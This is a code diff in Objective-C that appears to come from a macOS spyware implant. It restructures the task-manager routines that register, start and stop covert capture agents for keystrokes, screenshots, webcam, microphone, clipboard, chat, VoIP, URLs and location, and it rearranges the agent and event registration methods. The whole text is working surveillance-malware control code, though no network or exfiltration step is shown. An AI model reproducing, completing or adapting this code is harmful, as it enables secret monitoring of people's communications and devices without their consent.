+                                         offset: OFFT_CLIPBOARD
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop commmand to Agent Mouse");
+            infoLog(@"Stop command sent to Agent Clipboard", agentID);
 #endif
-
-            return NO;
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
           }
-        
-        break;
-      }
-    case AGENT_CHAT:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_IM
-                                fromComponent: COMP_CORE] == TRUE)
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_VOIP:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Voip");
+#endif
+          
+          NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+          
+          shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+          shMemoryHeader->agentID         = AGENT_VOIP;
+          shMemoryHeader->direction       = D_TO_AGENT;
+          shMemoryHeader->command         = AG_STOP;
+          
+          if ([gSharedMemoryCommand writeMemory: agentCommand
+                                         offset: OFFT_VOIP
+                                  fromComponent: COMP_CORE] == TRUE)
           {
 #ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Stop command sent to Agent %x", agentID);
+            infoLog(@"Stop command sent to Agent Voip", agentID);
 #endif
-            
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-            
-            [_logManager closeActiveLog: AGENT_CHAT
-                              withLogID: 0];
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
           }
-        else
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop command to agent CHAT");
-#endif
-
-            return NO;
-          }
-        
-        break;
-      }
-    case AGENT_CLIPBOARD:
-      {
-        agentCommand = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
-        
-        shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-        shMemoryHeader->agentID         = agentID;
-        shMemoryHeader->direction       = D_TO_AGENT;
-        shMemoryHeader->command         = AG_STOP;
-        
-        if ([gSharedMemoryCommand writeMemory: agentCommand
-                                       offset: OFFT_CLIPBOARD
-                                fromComponent: COMP_CORE] == TRUE)
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Stop command sent to Agent %x", agentID);
-#endif
-        
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-            
-            [_logManager closeActiveLog: AGENT_CLIPBOARD
-                              withLogID: 0];
-          }
-        else
-          {
-#ifdef DEBUG_TASK_MANAGER
-            infoLog(@"Error while sending Stop command to agent Clipboard");
-#endif
-
-            return NO;
-          }
-        
-        break;
-      }
-    case AGENT_POSITION:
-      {
+          
+          [agentCommand release];
+          
+          break;
+        }
+        case AGENT_POSITION:
+        {
 #ifdef DEBUG_TASK_MANAGER        
-        infoLog(@"Stopping Agent Position");
+          infoLog(@"Stopping Agent Position");
 #endif
-        __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
-        
-        if ([agentPosition stop] == FALSE)
+          __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
+          
+          if ([agentPosition stop] == FALSE)
           {
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"Error while stopping agent Position");
 #endif
-            return NO;
+            //return NO;
           }
-        break;
-      }
-    case AGENT_MICROPHONE:
-      {
-#ifdef DEBUG_TASK_MANAGER        
-        infoLog(@"Stopping Agent Microphone");
-#endif
-        __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
-        
-        if ([agentMic stop] == FALSE)
+          else
           {
-#ifdef DEBUG_TASK_MANAGER
-            errorLog(@"Error while stopping agent Microphone");
-#endif
-            return NO;
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
           }
-        
-        agentConfiguration = [self getConfigForAgent: agentID];
-        [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-        
-        break;
-      }
-    case AGENT_DEVICE:
-      {
+          break;
+        }
+        case AGENT_DEVICE:
+        {
 #ifdef DEBUG_TASK_MANAGER        
-        infoLog(@"Stopping Agent Device");
+          infoLog(@"Stopping Agent Device");
 #endif
-        __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
-
-        if ([agentDevice stop] == FALSE)
+          __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
+          
+          if ([agentDevice stop] == FALSE)
           {
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"Error while stopping agent agentDevice");
 #endif
-            return NO;
+            //return NO;
           }
-        else
+          else
           {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+            [anObject setObject: AGENT_STOPPED forKey: @"status"];
           }
-        break;
-      }
-    case AGENT_CRISIS:
-      {
+          break;
+        }
+        case AGENT_MICROPHONE:
+        {
 #ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Stopping Agent Crisis 0x%x", gAgentCrisis);
+          infoLog(@"Stopping Agent Microphone");
 #endif
-        gAgentCrisis &= ~(CRISIS_STARTSTOP);
-        
-#ifdef DEBUG_TASK_MANAGER
-        infoLog(@"Agent Crisis 0x%x (0x%x)", gAgentCrisis, ~(CRISIS_STARTSTOP));
-#endif
-        
-        __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
-        [infoManager logActionWithDescription: @"Crisis stopped"];
-        [infoManager release];
-        
-        // Only for input manager
-        if ([gUtil isLeopard])
+          __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
+          
+          if ([agentMic stop] == FALSE)
           {
-            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-            agentConfiguration = [[self getConfigForAgent: agentID] retain];
-
+#ifdef DEBUG_TASK_MANAGER
+            errorLog(@"Error while stopping agent Microphone");
+#endif
+          }
+          else
+          {
+            [anObject setObject: AGENT_STOPPED
+                         forKey: @"status"];
+          }
+          
+          break;
+        }
+        case AGENT_CRISIS:
+        {
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"%s: Stopping Agent Crisis");
+#endif
+          gAgentCrisis &= ~(CRISIS_STARTSTOP);
+          
+          __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
+          [infoManager logActionWithDescription: @"Crisis stopped"];
+          [infoManager release];
+          
+          // Only for input manager
+          if ([gUtil isLeopard])
+          {
+            NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
             shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-
+            
             shMemoryHeader->agentID = agentID;          
             shMemoryHeader->direction = D_TO_AGENT;
             shMemoryHeader->command = AG_STOP;
             memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
-
+            
             shMemoryHeader->commandDataSize = 0;
-
+            
             if ([gSharedMemoryCommand writeMemory: agentCommand
                                            offset: OFFT_CRISIS
                                     fromComponent: COMP_CORE] == TRUE)
-              {
-                [agentConfiguration setObject: AGENT_STOPPED
-                                       forKey: @"status"];
+            {
+              [anObject setObject: AGENT_STOPPED
+                           forKey: @"status"];
 #ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Start command sent to Agent CRISIS", agentID);
+              infoLog(@"Start command sent to Agent CRISIS", agentID);
 #endif
-              }
+            }
             else
-              {
+            {
 #ifdef DEBUG_TASK_MANAGER
-                infoLog(@"An error occurred while starting agent CRISIS");
+              infoLog(@"An error occurred while starting agent CRISIS");
 #endif
-                [agentCommand release];
-                [agentConfiguration release];
-                return NO;
-              }
+              [agentCommand release];
+              //return NO;
+            }
           }
-
-        break;
-      }
-    default:
-      {
-#ifdef DEBUG_TASK_MANAGER
-        errorLog(@"Unsupported agent: 0x%04x", agentID);
-#endif
-        
-        return NO;
+          
+          break;
+        }
+        default:
+          break;
       }
     }
+    
+    [status release];
+    [innerPool release];
+    
+    usleep(50000);
+  }
+  
+  [outerPool release];
   
   return YES;
 }
@@ -2710,414 +3119,6 @@ static NSLock *gSyncLock                  = nil;
   return YES;
 }
 
-- (BOOL)stopAgents
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
-  
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Stop all Agents called");
-#endif
-  
-  NSMutableDictionary *anObject;
-  int i = 0;
-  
-  //for (anObject in mAgentsList)
-  for (; i < [mAgentsList count]; i++)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      anObject = [mAgentsList objectAtIndex: i];
-      
-      int agentID = [[anObject objectForKey: @"agentID"] intValue];
-      NSString *status = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
-      
-      if ([status isEqualToString: AGENT_RUNNING] == TRUE)
-        {
-          switch (agentID)
-            {
-            case AGENT_SCREENSHOT:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Screenshot");
-#endif
-                __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
-                
-                if ([agentScreenshot stop] == FALSE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Error while stopping agent Screenshot");
-#endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-                
-                break;
-              }
-            case AGENT_ORGANIZER:
-              {
-#ifdef DEBUG_TASK_MANAGER        
-                warnLog(@"Stopping Agent Organizer");
-#endif
-                __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
-              
-                if ([agentOrganizer stop] == FALSE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    errorLog(@"Error while stopping agent Organizer");
-#endif
-                    //return NO;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Organizer stopped correctly");
-#endif
-                break;
-              }
-            case AGENT_CAM:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent WebCam");
-#endif
-                __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
-              
-                if ([agentWebcam stop] == FALSE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Error while stopping agent Webcam");
-#endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-              
-                break;
-              }
-            case AGENT_KEYLOG:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Keylogger");
-#endif
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_KEYLOG
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Stop command sent to Agent %x", agentID);
-#endif
-                    
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                    [_logManager closeActiveLog: AGENT_KEYLOG
-                                      withLogID: 0];
-                  }
-                
-                [agentCommand release];
-              
-                break;
-              }
-            case AGENT_URL:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent URL");
-#endif
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-              
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_URL
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Stop command sent to Agent URL", agentID);
-#endif
-                    
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                    [_logManager closeActiveLog: AGENT_URL
-                                      withLogID: 0];
-                  }
-                
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_APPLICATION:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Application");
-#endif
-                NSMutableData *agentCommand = 
-                [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_APPLICATION
-                                        fromComponent: COMP_CORE] == TRUE)
-                {
-#ifdef DEBUG_TASK_MANAGER
-                  infoLog(@"Stop command sent to Agent Application", agentID);
-#endif
-                  
-                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  [_logManager closeActiveLog: AGENT_APPLICATION
-                                    withLogID: 0];
-                }
-                
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_MOUSE:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Mouse");
-#endif
-              
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-              
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_MOUSE
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Stop command sent to Agent Mouse", agentID);
-#endif
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-              
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_CHAT:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent CHAT");
-#endif
-              
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_IM
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Stop command sent to Agent CHAT", agentID);
-#endif
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-              
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_CLIPBOARD:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Clipboard");
-#endif
-              
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_CLIPBOARD
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Stop command sent to Agent Clipboard", agentID);
-#endif
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-              
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_VOIP:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Voip");
-#endif
-              
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = AGENT_VOIP;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([gSharedMemoryCommand writeMemory: agentCommand
-                                               offset: OFFT_VOIP
-                                        fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Stop command sent to Agent Voip", agentID);
-#endif
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-              
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_POSITION:
-              {
-#ifdef DEBUG_TASK_MANAGER        
-                infoLog(@"Stopping Agent Position");
-#endif
-                __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
-                
-                if ([agentPosition stop] == FALSE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Error while stopping agent Position");
-#endif
-                    //return NO;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-                break;
-              }
-            case AGENT_DEVICE:
-              {
-#ifdef DEBUG_TASK_MANAGER        
-                infoLog(@"Stopping Agent Device");
-#endif
-                __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
-
-                if ([agentDevice stop] == FALSE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Error while stopping agent agentDevice");
-#endif
-                    //return NO;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
-                  }
-                break;
-              }
-            case AGENT_MICROPHONE:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"Stopping Agent Microphone");
-#endif
-                __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
-                
-                if ([agentMic stop] == FALSE)
-                  {
-#ifdef DEBUG_TASK_MANAGER
-                    errorLog(@"Error while stopping agent Microphone");
-#endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED
-                                 forKey: @"status"];
-                  }
-                
-                break;
-              }
-            case AGENT_CRISIS:
-              {
-#ifdef DEBUG_TASK_MANAGER
-                infoLog(@"%s: Stopping Agent Crisis");
-#endif
-                gAgentCrisis &= ~(CRISIS_STARTSTOP);
-
-                __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
-                [infoManager logActionWithDescription: @"Crisis stopped"];
-                [infoManager release];
-                
-                // Only for input manager
-                if ([gUtil isLeopard])
-                  {
-                    NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-
-                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-
-                    shMemoryHeader->agentID = agentID;          
-                    shMemoryHeader->direction = D_TO_AGENT;
-                    shMemoryHeader->command = AG_STOP;
-                    memset(shMemoryHeader->commandData, 0, sizeof(shMemoryHeader->commandData));
-
-                    shMemoryHeader->commandDataSize = 0;
-
-                    if ([gSharedMemoryCommand writeMemory: agentCommand
-                                                   offset: OFFT_CRISIS
-                                            fromComponent: COMP_CORE] == TRUE)
-                      {
-                        [anObject setObject: AGENT_STOPPED
-                                     forKey: @"status"];
-#ifdef DEBUG_TASK_MANAGER
-                        infoLog(@"Start command sent to Agent CRISIS", agentID);
-#endif
-                      }
-                    else
-                      {
-#ifdef DEBUG_TASK_MANAGER
-                        infoLog(@"An error occurred while starting agent CRISIS");
-#endif
-                        [agentCommand release];
-                        //return NO;
-                      }
-                  }
-                
-                break;
-              }
-            default:
-              break;
-            }
-        }
-      
-      [status release];
-      [innerPool release];
-      
-      usleep(50000);
-    }
-  
-  [outerPool release];
-  
-  return YES;
-}
-
 #pragma mark -
 #pragma mark Monitors
 #pragma mark -
@@ -3439,56 +3440,50 @@ static NSLock *gSyncLock                  = nil;
 #pragma mark Registering functions for events/actions/agents
 #pragma mark -
 
-- (BOOL)registerEvent: (NSData *)eventData
-                 type: (u_int)aType
-               action: (u_int)actionID
+- (BOOL)registerAgent: (NSData *)agentData
+              agentID: (u_int)agentID
+               status: (u_int)status
 {
 #ifdef DEBUG_TASK_MANAGER
-  verboseLog(@"Registering event type %d", aType);
+  verboseLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
+             (status == 1 ) ? @"activated" : @"deactivated", agentData);
 #endif
-
-  NSMutableDictionary *eventConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
+  NSMutableDictionary *agentConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
   
-  NSNumber *type    = [NSNumber numberWithUnsignedInt: aType];
-  NSNumber *action  = [NSNumber numberWithUnsignedInt: actionID];
+  NSNumber *tempID      = [NSNumber numberWithUnsignedInt: agentID];
+  NSString *agentState  = (status == 1) ? AGENT_ENABLED : AGENT_DISABLED;
   
-  NSArray *keys = [NSArray arrayWithObjects: @"type",
-                                             @"actionID",
-                                             @"data",
-                                             @"status",
-                                             @"monitor",
-                                             nil];
+  NSArray *keys = [NSArray arrayWithObjects: @"agentID",
+                   @"status",
+                   @"data",
+                   nil];
   
   NSArray *objects;
   
-  if (eventData == nil)
-    {
-      objects = [NSArray arrayWithObjects: type,
-                                           action,
-                                           @"",
-                                           EVENT_START,
-                                           @"",
-                                           nil];
-    }
+  if (agentData == nil)
+  {
+    objects = [NSArray arrayWithObjects: tempID,
+               agentState,
+               @"",
+               nil];
+  }
   else
-    {
-      objects = [NSArray arrayWithObjects: type,
-                                           action,
-                                           eventData,
-                                           EVENT_START,
-                                           @"",
-                                           nil];
-    }
+  {
+    objects = [NSArray arrayWithObjects: tempID,
+               agentState,
+               agentData,
+               nil];
+  }
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
-  [eventConfiguration addEntriesFromDictionary: dictionary];
-  [mEventsList addObject: eventConfiguration];
+  [agentConfiguration addEntriesFromDictionary: dictionary];
+  [mAgentsList addObject: agentConfiguration];
   
-  return YES;
+  return YES;  
 }
 
-- (BOOL)unregisterEvent: (u_int)eventID
+- (BOOL)unregisterAgent: (u_int)agentID
 {
   return YES;
 }
@@ -3544,50 +3539,56 @@ static NSLock *gSyncLock                  = nil;
   return YES;
 }
 
-- (BOOL)registerAgent: (NSData *)agentData
-              agentID: (u_int)agentID
-               status: (u_int)status
+- (BOOL)registerEvent: (NSData *)eventData
+                 type: (u_int)aType
+               action: (u_int)actionID
 {
 #ifdef DEBUG_TASK_MANAGER
-  verboseLog(@"Registering Agent ID (%x) with status (%@) and data:\n%@", agentID, 
-        (status == 1 ) ? @"activated" : @"deactivated", agentData);
+  verboseLog(@"Registering event type %d", aType);
 #endif
-  NSMutableDictionary *agentConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
   
-  NSNumber *tempID      = [NSNumber numberWithUnsignedInt: agentID];
-  NSString *agentState  = (status == 1) ? AGENT_ENABLED : AGENT_DISABLED;
-    
-  NSArray *keys = [NSArray arrayWithObjects: @"agentID",
-                                             @"status",
-                                             @"data",
-                                             nil];
+  NSMutableDictionary *eventConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
+  
+  NSNumber *type    = [NSNumber numberWithUnsignedInt: aType];
+  NSNumber *action  = [NSNumber numberWithUnsignedInt: actionID];
+  
+  NSArray *keys = [NSArray arrayWithObjects: @"type",
+                   @"actionID",
+                   @"data",
+                   @"status",
+                   @"monitor",
+                   nil];
   
   NSArray *objects;
   
-  if (agentData == nil)
-    {
-      objects = [NSArray arrayWithObjects: tempID,
-                                           agentState,
-                                           @"",
-                                           nil];
-    }
+  if (eventData == nil)
+  {
+    objects = [NSArray arrayWithObjects: type,
+               action,
+               @"",
+               EVENT_START,
+               @"",
+               nil];
+  }
   else
-    {
-      objects = [NSArray arrayWithObjects: tempID,
-                                           agentState,
-                                           agentData,
-                                           nil];
-    }
+  {
+    objects = [NSArray arrayWithObjects: type,
+               action,
+               eventData,
+               EVENT_START,
+               @"",
+               nil];
+  }
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
-  [agentConfiguration addEntriesFromDictionary: dictionary];
-  [mAgentsList addObject: agentConfiguration];
+  [eventConfiguration addEntriesFromDictionary: dictionary];
+  [mEventsList addObject: eventConfiguration];
   
-  return YES;  
+  return YES;
 }
 
-- (BOOL)unregisterAgent: (u_int)agentID
+- (BOOL)unregisterEvent: (u_int)eventID
 {
   return YES;
 }
@@ -3596,19 +3597,29 @@ static NSLock *gSyncLock                  = nil;
 #pragma mark Getter/Setter
 #pragma mark -
 
-- (NSArray *)eventsList
+- (NSArray *)agentsList
 {
-  return mEventsList;
+  return mAgentsList;
 }
 
 - (NSArray *)actionsList
 {
   return mActionsList;
 }
-
-- (NSArray *)agentsList
+- (NSArray *)eventsList
 {
-  return mAgentsList;
+  return mEventsList;
+}
+
+- (void)removeAllElements
+{
+#ifdef DEBUG_TASK_MANAGER
+  infoLog(@"Cleaning all internal conf objects");
+#endif
+  
+  [mEventsList  removeAllObjects];
+  [mActionsList removeAllObjects];
+  [mAgentsList  removeAllObjects];
 }
 
 - (NSArray *)getConfigForAction: (u_int)anActionID
@@ -3658,17 +3669,6 @@ static NSLock *gSyncLock                  = nil;
 #endif
 
   return nil;
-}
-
-- (void)removeAllElements
-{
-#ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Cleaning all internal conf objects");
-#endif
-  
-  [mEventsList  removeAllObjects];
-  [mActionsList removeAllObjects];
-  [mAgentsList  removeAllObjects];
 }
 
 - (NSString *)getControlFlag
